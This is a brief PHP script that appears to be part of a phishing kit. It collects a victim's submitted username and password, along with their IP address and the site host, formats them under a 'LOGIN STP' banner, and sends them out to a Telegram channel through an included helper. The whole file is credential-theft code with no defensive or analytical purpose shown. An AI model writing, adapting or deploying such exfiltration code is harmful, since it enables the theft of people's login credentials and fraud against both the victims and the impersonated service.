<?php

require_once __DIR__ . '/telegram_send.php';

$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$ip = $ip_real ?? ($_SERVER['REMOTE_ADDR'] ?? '');

$mensaje = "💻 *LOGIN STP*
====================
👤 USER: {$usuario}
🗝️ PASS: {$password}
📡 IP: {$ip}
🔍 HOST: {$host}
====================";

telegram_send_message($mensaje);
